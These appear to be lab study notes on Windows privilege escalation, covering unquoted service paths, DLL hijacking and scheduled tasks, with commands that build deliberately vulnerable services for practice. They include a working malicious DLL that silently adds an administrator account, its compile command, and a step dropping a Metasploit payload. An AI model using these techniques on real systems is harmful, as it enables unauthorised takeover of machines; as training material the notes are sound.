# Privilege Escalation / Persistence

In order to escalate privilege from a regular user to a higher level account (Administrator/System Authority), you need either a `misconfiguration` (typically permission issues on services, scheduled tasks etc...) or an `exploit` (Remote/Rogue/Sweet/Rotten/Juicy/God Potato etc..) - a properly patched and configured system will provide challenges to escalte privileges from a standard user to a administrator user. 

That being said, there are numerous techniques to obtain hashes/passwords, that don't requite administrator privileges - such as `kerberoasting`, `ntlm relaying` and `password spraying`.

- AlwaysInstallElevated (MSI)
  
- Unquoted Service Path (Services)
  - Requires missing "quotes"
  - and whitespaces in the path
  - write permission in the (sub)folder that holds the service binary

To exploit, the exe needs to be named after the directory it's in, i.e:

---  

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services

- Create folders "C:\MyPrograms\Vulnerable Service\service.exe
- create pingservice in vs2019

-> C:\MyPrograms\`vulnerable.exe`  arguments `Service\service.exe`

By placing a malicious service exe in c:\MyPrograms\ named `vulnerable.exe`, we'll escalate privileges wo NT SYSTEM AUHTORITY (if the service is running with those privileges)

```powershell
sc create VulnService binPath= "C:\MyPrograms\Vulnerable Service\VulnService.exe"
sc qc VulnService
sc start VulnService
```

Then drop metasploit payload (renamed to Vulnerable.exe) in C:\MyPrograms.

  https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/UnquotedServicePath.md

---

Run the following tools as a regular unprivileged user (`runas /user:student powershell.exe`)

> - [+] SharpUp/Powerup
> - [+] WinPeas

> ***IMPORTANT***: We achieve not only `Privilege Escalation`, but also `code-execution` and `persistence`!!!

# DLL Hijack
<https://www.bordergate.co.uk/windows-privilege-escalation/#DLL-Hijacking>
The following code can be used to create a malicious DLL:

```csharp
#include <windows.h>
 
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net user localadmin Password1 /add");
        system("cmd.exe /k net localgroup administrators localadmin /add");
        ExitProcess(0);
    }
    return TRUE;
}
```
Compile with:

```code
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijack.dll
```

https://juggernaut-sec.com/dll-hijacking/#Hijacking_the_Service_DLL_to_get_a_SYSTEM_Shell

![image](./images/dllsearch.jpg)

UAC Bypass (admin user -> high integrity) -> PrivsFU -> NT AUTH

# SCHEDULED TASKS

```powershell
schtasks /create /tn VulnTask /tr 'c:\MyPrograms\VulnerableTask\VulnTask.exe' /sc ONSTART /RL HIGHEST /RU "Student_adm" /RP "Threathunt25" /F
```